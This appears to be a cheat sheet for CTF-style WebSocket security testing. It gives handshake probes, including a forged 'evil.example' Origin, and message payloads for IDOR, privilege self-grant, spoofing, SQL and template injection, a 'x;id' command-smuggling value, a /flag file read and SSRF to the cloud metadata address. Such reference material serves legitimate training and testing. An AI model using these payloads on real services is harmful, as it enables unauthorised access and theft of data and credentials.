# Quick reference (deep) — the extended cheat sheet

## The pass — the six steps

```text
1. recon     -> bundle_miner + grep -> the endpoint + framing + schema
2. handshake -> origin/binding/unauth/token/subproto/samesite
3. framing   -> raw/42[...]/a[...]/STOMP/{"type":}/binary
4. messages  -> idor/action/spoof/inject/subscribe — one field/conn
5. verdict   -> the oracle reply -> the verbatim bytes
6. route     -> the flag-closing class
```

## The handshake commands

```bash
python3 tools/web/ws_probe.py "$WS/ws" --message '{}'
python3 tools/web/ws_probe.py "$WS/ws" --origin 'https://evil.example' --message '{}'
python3 tools/web/ws_probe.py "$WS/ws" --origin 'null' --message '{}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"me"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Authorization: Bearer x' --message '{"action":"me"}'
python3 tools/web/ws_probe.py "$WS/ws?token=eyJ" --message '{"action":"me"}'
python3 tools/web/ws_probe.py "$WS/ws" --message '{"action":"me"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Sec-WebSocket-Protocol: graphql-ws' --message '{}'
curl -sI "$BASE/login" | grep -i 'set-cookie'
```

## The message commands — the field set

```bash
# idor
--message '{"action":"read","id":"victim"}'
--message '{"action":"open","doc":"admin-doc"}'
--message '{"action":"history","room":"admin-dm"}'
# membership
--message '{"action":"join","room":"admin"}'
--message '{"action":"subscribe","channel":"internal"}'
# dispatch
--message '{"action":"admin"}'
--message '{"action":"flag"}'
--message '{"action":"eval","code":"x"}'
# self-grant
--message '{"action":"x","role":"admin"}'
--message '{"action":"x","user":{"role":"admin"}}'
# spoof
--message '{"from":"victim","action":"x"}'
--message '{"user_id":2,"action":"x"}'
# inject
--message '{"q":"'"'"' OR 1=1--"}'
--message '{"name":"{{7*7}}"}'
--message '{"file":"/flag"}'
--message '{"host":"x;id"}'
--message '{"url":"http://169.254.169.254/"}'
# subscription
--message '{"type":"subscribe","payload":{"query":"subscription{...}"}}'
# resume
--message '{"session_id":"<old>"}'
--message '{"action":"history","room":"x","from":0}'
```

## The transport shapes — send THESE

```text
raw            {"action":"x"}
socket.io      42["x",{...}]            40{"token"}   42/admin,["e",{..}]
sockjs         a["{\"action\":\"x\"}"]
stomp          SEND destination:/app/x  SUBSCRIBE destination:/user/x
graphql-ws     {"type":"connection_init",...}  {"type":"subscribe",...}
mqtt           CONNECT / SUBSCRIBE {#,+} / PUBLISH {topic,payload}
protobuf       a binary frame -> proto_decode.py
```

## The verdict-map — the reply → the class

```text
another's object     -> message-IDOR -> web-idor
a privileged reply   -> dispatch gap -> the flag/web-auth-session
the eval             -> inject -> the payload class
a pushed feed        -> subscribe-IDOR -> web-idor
a self-grant         -> the grant -> web-mass-assignment
acts-as-other        -> spoof -> web-auth-session
a state-change       -> write-side -> the impact
the victim's data    -> CSWSH -> web-websocket
a foreign-Origin+legs -> CSWSH -> web-websocket
no-auth+data         -> unauth -> web-websocket
?token=              -> credential -> web-auth-session/info-disclosure
```

## The negative-map — the reply → the verdict

```text
"forbidden"/"unauthorized" -> uniform — closed
"unknown action"           -> weak-neg — the real schema
"invalid field"            -> weak-neg — the real field names
"not found" on a guess-id  -> weak-neg — a known-other id
"malformed"/"bad request"  -> framing-error — the real envelope
silence/drop               -> gap — a state-check
500/crash                  -> candidate — a differential
pong/ok/echo/101           -> surface — not a finding
```

## The boundary-map — the confusables

```text
a frame-field inject -> the PAYLOAD class
an HTTP object-gap   -> web-idor
a token-forge        -> web-auth-session
a one-shot CSRF      -> web-csrf
a graphql query      -> web-graphql
```

## The budget

```text
5 probes / 15 min per mechanism class
25 probes / 45 min per challenge
the escalate: chain_match -> reclassify -> writeup_search ->
              novel_plan -> fanout_sweep -> solver_handoff
```
